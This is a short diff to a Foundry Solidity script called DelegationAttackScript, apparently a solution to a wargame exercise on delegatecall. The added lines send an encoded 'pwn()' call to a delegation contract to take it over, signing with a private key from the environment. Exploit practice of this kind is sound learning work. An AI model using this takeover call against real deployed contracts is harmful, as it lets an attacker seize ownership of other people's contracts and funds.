@@ -11,6 +11,9 @@ contract DelegationAttackScript is Script {
 
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        bytes memory data = abi.encodeWithSignature("pwn()");
+        (bool success, ) = address(delegation).call(data);
+        require(success, "Call failed");
         vm.stopBroadcast();
     }
 }
